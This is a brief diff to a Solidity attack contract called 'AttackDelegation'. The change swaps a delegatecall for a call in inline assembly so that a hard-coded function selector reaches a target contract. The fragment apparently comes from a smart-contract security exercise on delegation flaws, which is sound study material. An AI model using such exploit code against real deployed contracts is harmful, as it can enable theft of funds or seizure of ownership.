@@ -11,7 +11,7 @@ contract AttackDelegation {
         assembly {
             mstore(0x60, 0xdd365b8b)
             let contractAddress := sload(deletationContract.slot)
-            let result := delegatecall(gas(), contractAddress, 0x60, 0x04, 0, 0)
+            let result := call(gas(), contractAddress, 0, 0x7c, 0x04, 0, 0)
             let size := returndatasize()
             returndatacopy(0x60, 0, size)
             switch result
